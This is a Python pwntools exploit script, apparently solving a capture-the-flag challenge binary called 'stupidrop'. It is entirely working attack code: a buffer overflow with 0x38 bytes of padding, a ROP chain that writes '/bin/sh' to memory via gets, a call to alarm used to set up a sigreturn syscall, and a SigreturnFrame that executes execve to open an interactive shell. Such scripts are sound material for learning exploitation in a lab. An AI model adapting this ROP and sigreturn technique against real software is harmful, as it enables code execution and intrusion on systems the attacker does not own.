from pwn import *

target = process('./stupidrop')
# gdb.attach(target, gdbscript='b *0x400289')
elf = ELF('stupidrop')
context.arch = 'amd64'

syscall = p64(0x40063e)
popRdi = p64(0x4006a3)
gets = p64(elf.symbols['gets'])
alarm = p64(elf.symbols['alarm'])
binshAdr = p64(0x601050)

payload = b'0' * 0x38
payload += popRdi
payload += binshAdr
payload += gets
payload += popRdi
payload += p64(0xf)
payload += alarm
payload += popRdi
payload += p64(0x0)
payload += alarm
payload += syscall

frame = SigreturnFrame()
frame.rip = 0x40063e
frame.rax = 0x3b
frame.rdi = 0x601050
frame.rsi = 0x0
frame.rdx = 0x0

payload += bytes(frame)

target.sendline(payload)
raw_input()
target.sendline("/bin/sh\x00")
target.interactive()

